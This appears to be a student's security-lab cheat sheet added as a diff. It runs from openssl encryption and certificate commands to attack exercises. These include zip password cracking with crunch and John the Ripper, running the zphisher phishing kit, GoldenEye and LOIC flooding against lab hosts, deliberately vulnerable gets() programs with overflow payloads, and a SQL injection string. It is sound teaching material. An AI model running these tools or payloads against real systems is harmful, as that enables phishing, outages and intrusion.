@@ -1,0 +1,290 @@
+
+																					$ encryption $
+
+#### symmetric encryption ####
+
+echo 'exam' > secrets.txt 
+
+openssl aes-256-cbc -e -in secrets.txt -out secrets.txt.enc
+
+
+ls -l | grep secrets.txt.enc 
+
+openssl aes-256-cbc -d -in secrets.txt.enc -out secrets.txt.dec  
+
+cat secrets.txt.dec 
+
+
+
+
+
+#### file encryption #####
+
+openssl rand 128 > symmetric_keyfile.key  
+
+openssl enc -in secrets.txt -out secrets.txt.enc -e -aes256 -k symmetric_keyfile.key 
+
+openssl enc -in secrets.txt.enc -out secrets.txt.dec -d -aes256 -k symmetric_keyfile.key
+
+cat secrets.txt.dec 
+
+
+
+
+
+#### asym encrypt  #####
+
+echo -n "exam" > hello.txt
+
+																	# Generate a 2048-bit RSA private key
+openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048
+
+													# Convert to PKCS#1 format for compatibility with pkeyutl
+openssl rsa -in private_key.pem -out rsa_private_key.pem
+
+														# Extract the public key
+openssl rsa -in private_key.pem -pubout -out public_key.pem
+
+openssl pkeyutl -encrypt -pubin -inkey public_key.pem -in hello.txt -out EncryptedData.encrypted -pkeyopt rsa_padding_mode:pkcs1
+
+
+openssl pkeyutl -decrypt -inkey rsa_private_key.pem -in EncryptedData.encrypted -out DecryptedData.txt -pkeyopt rsa_padding_mode:pkcs1
+
+cat DecryptedData.txt
+
+
+
+
+
+
+
+
+#### Encrypt with Private Key and Decrypt with Public Key ####
+
+echo -n "exam" > PlainTextFile.txt
+
+openssl rsautl -inkey private_key.pem -sign -in PlainTextFile.txt -out data_with_private_key.encrypted
+
+openssl rsautl -inkey public_key.pem -pubin -in data_with_private_key.encrypted -out decrypted_with_public.txt 
+
+cat decrypted_with_public.txt 
+
+
+
+
+
+
+
+
+																				$ certificate CA $
+                                        
+                                        
+# gen private key 
+
+ openssl genrsa -out private_key.pem 2048
+ 
+ # create a certificate siging request
+ 
+ openssl req -new -key private_key.pem -out certificate.csr
+ 
+ # sign the certificate 
+ 
+ openssl x509 -req -in certificate.csr -signkey private_key.pem -out self_signed_certificate.crt -days 365
+ 
+ 
+ # view certificate details 
+ 
+ openssl x509 -in self_signed_certificate.crt -text -noout
+ 
+ # verify certificate integrity 
+ 
+ openssl verify -CAfile self_signed_certificate.crt self_signed_certificate.crt
+
+
+# check for expiry
+
+openssl x509 -in self_signed_certificate.crt -enddate -noout
+
+# generate private key for the root CA
+
+openssl genrsa -out root_ca_key.pem 4096
+
+# create self signed root CA certificate
+
+openssl req -x509 -new -nodes -key root_ca_key.pem -sha256 -days 1024 -out root_ca_certificate.crt
+
+
+# create private key for server
+
+openssl genrsa -out server_key.pem 2048
+
+# create a csr for server 
+
+openssl req -new -key server_key.pem -out server_certificate.csr
+
+# sign the servers csr with root CA
+
+openssl x509 -req -in server_certificate.csr -CA root_ca_certificate.crt -CAkey root_ca_key.pem -CAcreateserial -out server_certificate.crt -days 365 -sha256
+
+
+
+
+
+
+
+
+
+																			$ pwd gen crunch & jhon the ripper $
+
+
+echo "This is a test file for password cracking." > testfile.txt
+
+
+ls -l testfile.txt
+
+
+# custom wordlist
+
+crunch 6 6 abcdef -o wordlist.txt
+
+ls -l wordlist.txt
+
+head wordlist.txt
+
+
+#create zip protected file
+
+zip -e test.zip testfile.txt
+
+unzip -l test.zip
+
+zip2john test.zip > test.hash
+
+cat test.hash
+
+john --wordlist=wordlist.txt test.hash
+
+john --show test.hash
+
+
+
+
+
+
+
+
+
+																					$ z phisher & dos attack $
+                                          
+
+git clone https://github.com/htr-tech/zphisher.git
+
+cd zphisher
+chmod +x zphisher.sh
+bash zphisher.sh
+
+
+
+git clone https://github.com/jseidl/GoldenEye.git
+cd GoldenEye
+chmod +x goldeneye.py
+python3 goldeneye.py http://10.0.2.15 -w 50 -s 200
+
+
+
+
+
+
+																						$ buffer overflow $
+                                            
+
+#include <stdio.h>
+#include <string.h>
+
+int main(void) {
+    char buff[15];
+    int pass = 0;
+
+    printf("\nEnter the password:\n");
+
+    // WARNING: gets() is unsafe and prone to buffer overflow!
+    gets(buff);
+
+    // strcmp returns 0 if strings are equal
+    if (strcmp(buff, "bufferoverflow")) {
+        printf("\nWrong Password\n");
+        printf("Password flag = %d\n", pass);
+    } else {
+        printf("\nCorrect Password\n");
+        pass = 1;
+    }
+
+    if (pass) {
+        // Admin rights granted
+        printf("\nRoot privileges given to the user\n");
+        printf("Password flag = %d\n", pass);
+    }
+
+    return 0;
+}
+
+
+gcc -fno-stack-protector -z execstack -no-pie overflow.c -o overflow
+./overflow
+
+
+python3 -c 'print("A"*15 + "\x01\x00\x00\x00")' > payload.txt
+./overflow < payload.txt
+
+
+
+
+																					$ stack overflow $
+
+#include <stdio.h>
+#include <string.h>
+
+void vulnerable_function() {
+    char buffer[64];
+
+    printf("Enter something:\n");
+    gets(buffer);  // Vulnerable to stack overflow!
+
+    printf("You entered: %s\n", buffer);
+}
+
+int main() {
+    vulnerable_function();
+    printf("Returned safely from vulnerable_function.\n");
+    return 0;
+}
+
+
+
+
+
+gcc -fno-stack-protector -z execstack -no-pie stack_overflow.c -o stack_overflow
+
+python3 -c 'print("A"*72)' | ./stack_overflow
+
+
+gdb ./stack_overflow
+run <<< $(python3 -c 'print("A"*72)')
+info registers
+
+
+
+cd LOIC_GUI
+mono LOIC.exe
+
+`https://testphp.vulnweb.com/`
+sudo tcpdump -i eth0 -n -X "tcp[tcpflags] & (tcp-syn) != 0"
+sudo tcpdump -i eth0 -A "port 80"
+
+`' OR 1=1--`
+
+
+
+
+
+
